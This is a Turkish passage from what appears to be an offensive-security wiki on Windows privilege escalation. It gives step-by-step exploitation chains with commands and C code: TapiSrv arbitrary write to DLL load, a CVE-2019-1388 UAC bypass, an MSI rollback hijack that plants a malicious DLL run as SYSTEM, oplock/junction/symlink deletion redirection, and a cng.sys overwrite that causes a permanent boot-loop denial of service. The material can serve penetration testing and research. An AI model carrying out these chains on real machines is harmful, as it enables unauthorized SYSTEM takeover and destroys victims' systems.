Bir **client** pipe üzerinden veri gönderdiğinde, pipe’ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client’ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir süreci** tespit etmek, kurduğunuz pipe ile etkileşime girdiğinde o sürecin kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Böyle bir saldırıyı gerçekleştirme yönergeleri için [**buradaki**](named-pipe-client-impersonation.md) ve [**buradaki**](#from-high-integrity-to-system) kılavuzlara bakabilirsiniz.

Ayrıca, aşağıdaki araç **burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc fırsatlarını bulmak için tüm pipe’ları listeleyip görüntülemenizi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Sunucu modundaki Telephony hizmeti (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu kullanıma açar. Kimliği doğrulanmış uzak bir client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` işlemini, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya yönelik rastgele bir **4-byte write** işlemine dönüştürebilir; ardından Telephony admin hakları elde edip hizmet olarak rastgele bir DLL yükleyebilir. Sürecin tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir yol olarak ayarlayarak `ClientAttach` çağrısı yapın → hizmet, bu yolu `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event yazımları için kullanır.
- Her event, `Initialize` işlemindeki saldırgan kontrollü `InitContext` değerini bu handle’a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın ve ardından deterministik yazımları tekrarlamak için kaydı kaldırıp kapatın.
- `C:\Windows\TAPI\tsec.ini` dosyasındaki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için rastgele bir DLL yolu ile `GetUIDllName` çağrısı yapın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows’ta çalıştırılabilecek dosya uzantıları

[https://filesec.io/](https://filesec.io/) **sayfasına göz atın**

### Markdown renderers üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`’ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler’larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir şema) tetikleyebilir ve saldırgan kontrollü dosyaları mevcut kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line izleme**

Bir kullanıcı olarak shell aldığınızda, **kimlik bilgilerini command line üzerinden ileten** zamanlanmış görevler veya çalışan başka süreçler olabilir. Aşağıdaki script, süreç command line’larını iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak değişiklikleri görüntüler.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcı olarak terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir süreci çalıştırmak mümkündür.

Bu sayede aynı güvenlik açığıyla hem ayrıcalıkları yükseltmek hem de UAC'yi bypass etmek mümkündür. Ayrıca herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosyalara ve bilgilere aşağıdaki GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junctions Yönlendirme

Bir uygulama, öngörülebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp yerine bir NTFS junction koyabiliyorsa yazma işlemi, junction'ı izleyerek web sunucusunun sunduğu bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web-service kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; tek başına yazılabilir bir upload dizini veya mevcut bir junction bunu kanıtlamaz.

Upload handler'daki tam yol oluşturma mantığını ve zamanlamayı, kullanıcının alt dizin üzerindeki etkin silme/oluşturma haklarını, hedef dizinin etkin ACL'lerini, yazma işlemini yapan bileşenin reparse point'leri izleyip izlemediğini ve web sunucusunun bu hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapan bileşenin ve web sunucusunun process identity değerlerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekte gerçekleşebilecek bir junction değişimini ortaya koyamaz. Çalıştırma bir service account altında gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF-triggered Privileged Scheduled-task Cleanup

Elle çalıştırmayı reddeden bir scheduled task yine de ayrıcalıksız bir trigger açığa çıkarabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'sinin, principal'ının ve action'ının yanı sıra **tüm** trigger'ları inceleyin. Özellikle `WnfStateChangeTrigger`, bir Windows Notification Facility (WNF) state'i belirtir; bu securable state mevcut kullanıcının update yayımlamasına izin veriyorsa kullanıcı, `<AllowStartOnDemand>false</AllowStartOnDemand>` ayarına rağmen task'ı yapılandırılmış kimliği altında dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyor, standart bir kullanıcının WNF state `7508BCA32C079E41` için update göndermesini kabul ediyor ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` konumunu inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ZwUpdateWnfStateData` işlevini `ntdll.dll` içinden çözümleyin, sekiz baytlık durum adı için boş bir güncelleme gönderin ve döndürülen durumu görevin son çalıştırılma verileriyle veya Procmon etkinliğiyle ilişkilendirin. Aşağıdaki basitleştirilmiş probe, Recall görevi örneğindeki bayt dizisini kullanır; test edilen görev için dışa aktarılan baytları kullanın.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Recursive cleanup işlemini ayrıcalıklı silmeye dönüştürme

Kullanışlı primitive tek başına tetikleyici değil, saldırganın kontrol ettiği bir dizini kabul eden ayrıcalıklı bir temizleme rutinidir. İşlemi dizinlerin listelenmesinden son değişikliğe kadar izleyin: profil/oturum keşfi, wildcard ile seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, önceden kontrol edilmiş bir yol adının daha sonra recursive olarak gezileceğine dair güçlü göstergelerdir. Alt öğeler güvenilir dizin handle'larına göre açılıp silinmeden önce doğrulanmıyorsa, saldırgan listeleme ile kullanım arasında yol çözümlemesini değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction ve Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) tekniğiyle birleştirin: oplock, temizleyiciyi meşru alt öğeyi seçtikten sonra duraklatırken yazılabilir üst dizin değiştirilir; böylece ayrıcalıklı silme işlemi devam ettiğinde `\RPC Control` üzerinden korunan hedefe yönelir. Recall zincirinde bu yöntem, belgelenen MSI rollback tekniğinin gerektirdiği `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler, yüzeysel reparse-point düzeltmelerini aşar

Yalnızca saldırganın kontrol ettiği kök dizini ve doğrudan alt öğesini doğrulamak, yol adlarına dayalı recursive silme işlemini güvenli hale getirmez. Kontrol edilen bu nesneleri meşru bırakıp junction/oplock substitution işlemini bunların altındaki ek bir alt öğeye taşıyın; `IFileOperation::DeleteItem` sonunda doğrulanmamış alt öğeye ulaşır ve yeni hedefini izler. CVE-2026-20941, ilk Recall yamasının `UKP`'yi ve GUID biçimindeki dizini doğrulamasına rağmen eski recursive silme işlemini koruması sonucu ortaya çıkan bu eksik düzeltme sınıfına örnektir.<sup>[[43]](#references)</sup>

Güvenli yaklaşım, **her alt öğeyi** önceden güvenilir bir dizin handle'ına göre açmak, çözümlenen son yolu/nesneyi alıp doğrulamak ve silme disposition'ını bu doğrulanmış handle'a uygulamaktır. Bir öneki doğrulayıp ardından yeniden yol adına dayalı recursive silmeye dönmeyin. Yamayı incelerken gerçek çağrı noktasındaki yapıları da kontrol edin: bu durumda `NtCreateFile` çağrısında `OBJECT_ATTRIBUTES` yapısının çalışma zamanında incelenmesi, `RootDirectory` değerinin null olmadığını ve `{GUID}\\secure_file.lock` adının göreli olduğunu göstererek, ikinci bir `FILE_DELETE_ON_CLOSE` primitive'i olduğunu düşündüren yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## Herhangi Bir Klasörü Silme/Taşıma/Yeniden Adlandırma Yoluyla SYSTEM EoP

Bu teknik [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmıştır; exploit koduna [**buradan ulaşılabilir**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, Windows Installer'ın rollback özelliğini kötüye kullanarak kaldırma işlemi sırasında meşru dosyaları zararlı dosyalarla değiştirmeye dayanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **zararlı bir MSI installer** oluşturması gerekir. Windows Installer daha sonra bu klasörü diğer MSI paketlerini kaldırırken rollback dosyalarını depolamak için kullanır; saldırgan bu dosyaları zararlı payload içerecek şekilde değiştirmiş olur.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM ayrıcalıklarıyla çalışan `msiexec.exe` hizmetine erişebilir. Reverse engineering çalışması, ilgili `IMsiServer` çağrılarının vtable'daki `0xA0` offset'inde `MsiBeginTransactionW`, `0xC8` offset'inde `SetEEUIDirectoryAndFilter` ve `0x50` offset'inde `CleanupTempPackages` olduğunu belirledi. Bu adlar ve offset'ler reverse engineering ile elde edilmiştir ve build'ler arasında değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, yalnızca sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken çağıranı impersonate eder. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak kontrol edilen dosya nesnesini sonraki temizleme işlemine bağlamaz veya nesnenin Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filter argümanından bağımsız olarak yolu klasör olarak zamanlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın kontrol ettiği yol, `0x00000002` verisi ise klasör flag'idir. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan temizleme işlemine girer. Yükseltilmiş yetkilerle çalışan worker, registry değerlerini listeler ve klasör girdilerini yolun kaynağını denetlemeden recursive `FDeleteFolder` işlevine aktarır. Normal silme işlemi başarısız olursa kod ayrıca `LockdownPath` çağrısı yapar, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından elde edilen en kısa çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi değil, path reuse yöntemidir. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, silin ve Windows Installer'ın daha sonra bu pathname'i korumalı rollback verileriyle yeniden oluşturmasını sağlayın. Cleanup, eski `TempPackages` adına güvenir ve yeni dizini SYSTEM olarak siler. Bu yöntem, reparse point gerektirmediğinden `FILE_FLAG_OPEN_REPARSE_POINT` ve redirection-trust mitigation ile amaçlanan sınırı aşar.<sup>[[41]](#references)</sup>

Bu silme primitive'i aşağıdaki rollback zincirine uygundur: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL'yi güçlendirmeden önce `WRITE_DAC` yetkisi verilmiş bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin veren bir DACL'yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` dosyası değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkinleştirildiğinde `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu path'i düzeltti. COM çağrısı yine de başarı döndürebilir, ancak artık saldırganın kontrolündeki path'i `TempPackages` içine eklemez. Başarılı method dönüşünü patch testi olarak kullanmak yerine April 2025 Windows security updates güncellemelerini yükleyin.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` dizinini boş bırakın)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - Non-admin bir kullanıcının çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Yüklemeden sonra dosyaya ait bir **handle** açık tutun.

- Adım 2: Uninstall işlemini başlatın
    - Aynı `.msi` dosyasını uninstall edin.
    - Uninstall işlemi dosyaları `C:\Config.Msi` içine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini algılamak için açık dosya handle'ını **`GetFinalPathNameByHandle` ile sürekli kontrol edin**.

- Adım 3: Özel senkronizasyon
    - `.msi`, aşağıdakileri yapan bir **özel uninstall action (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyasının yazıldığını bildirir.
        - Ardından uninstall işlemine devam etmeden önce başka bir event'i **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Sinyal geldiğinde, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın **silinmesini engeller**.
    - Ardından uninstall işleminin tamamlanabilmesi için **karşı tarafa sinyal gönderin**.
    - Windows Installer, `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - `.rbf` dosyasını siz (saldırgan) elle silin.
    - Artık **`C:\Config.Msi` boş** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM düzeyinde arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Aşama 2 – Rollback Script'lerini Kötücül Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` yetkisiyle bir handle'ı **açık tutun**.

- Adım 7: Başka bir install işlemi çalıştırın
    - `.msi` dosyasını tekrar yükleyin ve şu değerleri kullanın:
        - `TARGETDIR`: Yazılabilir bir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen bir değişken.
    - Bu install işlemi, `.rbs` ve `.rbf` dosyalarını yeniden okuyacak olan **rollback** işlemini tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını alın.

- Adım 9: Rollback öncesinde senkronize edin
    - `.msi`, aşağıdakileri yapan bir **özel install action (`SyncBeforeRollback`)** içerir:
        - `.rbs` dosyası oluşturulduğunda bir event sinyali gönderir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` event'ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **güçlü ACL'leri yeniden uygular**.
        - Ancak hâlâ `WRITE_DAC` yetkisi olan bir handle tuttuğunuzdan, **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken denetlenir**, bu nedenle klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - `.rbs` dosyasının üzerine, Windows'a şunları yaptıran **sahte bir rollback script'i** yazın:
        - `.rbf` dosyanızı (kötücül DLL) ayrıcalıklı bir konuma (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini.
    - **SYSTEM düzeyinde kötücül payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback işlemini tetikleyin
    - Installer'ın devam etmesi için senkronizasyon event'ine sinyal gönderin.
    - Belirli bir noktada install işlemini **bilerek başarısız kılacak şekilde** bir **type 19 custom action (`ErrorOut`)** yapılandırılmıştır.
    - Bu, **rollback işleminin başlamasına** neden olur.

- Adım 13: SYSTEM DLL'inizi yükler
    - Windows Installer:
        - Kötücül `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path'te kötücül DLL'iniz** vardır.

- Son adım: SYSTEM kodunu çalıştırın
    - Hijack ettiğiniz DLL'i yükleyen, güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
    - **İşlem tamam**: Kodunuz **SYSTEM olarak** çalışır.


### Arbitrary File Delete/Move/Rename İşlemlerinden SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki teknik), **tam bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability yalnızca **arbitrary file deletion** imkânı sağlıyorsa?

**NTFS internals**'tan yararlanabilirsiniz: her klasörde şu adlı gizli bir alternate data stream bulunur:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **indeks metadata** bilgilerini depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *dosya* silme API'sini çağırıyor olsanız da **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize **izin veriyorsa** ne olur?

1. Adım 1: Yem klasörü ve dosyası oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` dosyasına bir **oplock** koyun
- Ayrıcalıklı bir işlem `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM sürecini tetikleyin (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Step 4: Oplock callback içinde – silme işlemini yönlendirin

- Option A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'i vaktinden önce serbest bırakır.

- Option B: `folder1` klasörünü bir **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedefler — bu akışı silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırakın
- SYSTEM süreci devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle aslında silinen:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Rastgele Klasör Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak rastgele bir klasör oluşturmanıza** olanak tanıyan bir primitive'i exploit edin — **dosya yazamasanız** veya **zayıf izinler ayarlayamasanız** bile.

**Kritik bir Windows sürücüsünün** adını taşıyan bir **klasör** oluşturun (dosya değil), örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden bir klasör olarak oluşturursanız**, Windows önyükleme sırasında gerçek driver'ı yükleyemez.
- Ardından Windows, önyükleme sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümlenemediği için yükleyemez** ve **çöker veya önyüklemeyi durdurur**.
- **Geri dönüş seçeneği yoktur** ve harici müdahale (ör. önyükleme onarımı veya diske erişim) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı günlük/yedekleme yolları + OM symlinks ile rastgele dosya üzerine yazma / önyükleme DoS

Bir **ayrıcalıklı service**, **yazılabilir bir config** dosyasından okunan bir yola günlükleri/dışa aktarılan verileri yazdığında, **SeCreateSymbolicLinkPrivilege olmadan bile** ayrıcalıklı yazma işlemini rastgele dosya üzerine yazmaya dönüştürmek için bu yolu **Object Manager symlinks + NTFS mount points** kullanarak yönlendirin.<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu içeren config dosyası saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için mount point ve bir OM file symlink oluşturabilme olanağı (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazma yapan ayrıcalıklı bir işlem (günlük, dışa aktarma, rapor).

**Örnek zincir**
1. Ayrıcalıklı günlük hedefini config dosyasından alın; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. admin, "test SMS'i gönder" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma, Windows'un kurcalanmış driver yolunu yüklemesine neden olur → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir service'in yazma amacıyla açacağı korumalı herhangi bir dosya için de geçerlidir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce bu kopyanın yüklenmesi denenebilir. Bu da bozuk veriler için güvenilir bir DoS hedefi oluşturur.



## **High Integrity'den System'e**

### **Yeni service**

Zaten High Integrity bir process içinde çalışıyorsanız, **SYSTEM'e giden yol** yalnızca **yeni bir service oluşturup çalıştırarak** kolayca açılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir process'ten **AlwaysInstallElevated registry entries'ı etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[İlgili registry keys ve _.msi_ paketi yükleme hakkında daha fazla bilgiye buradan ulaşabilirsiniz.](#alwaysinstallelevated)

### High + SeImpersonate ayrıcalığından System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (muhtemelen bunları zaten High Integrity olan bir process'te bulursunuz), SeDebug ayrıcalığıyla **neredeyse tüm process'leri** (protected process'ler hariç) **açabilir**, process'in **token'ını kopyalayabilir** ve bu token'la **herhangi bir process oluşturabilirsiniz**.\
Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan bir process seçmek için kullanılır** (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, `getsystem` içindeki meterpreter tarafından ayrıcalık yükseltmek için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazmak için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından **`SeImpersonate`** ayrıcalığıyla pipe'ı oluşturan **server**, pipe client'ının (service) token'ını **taklit ederek** SYSTEM ayrıcalıklarını elde edebilir.\
[**Name pipes hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Name pipes kullanarak High Integrity'den System'e nasıl geçileceğine dair bir örneği okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).
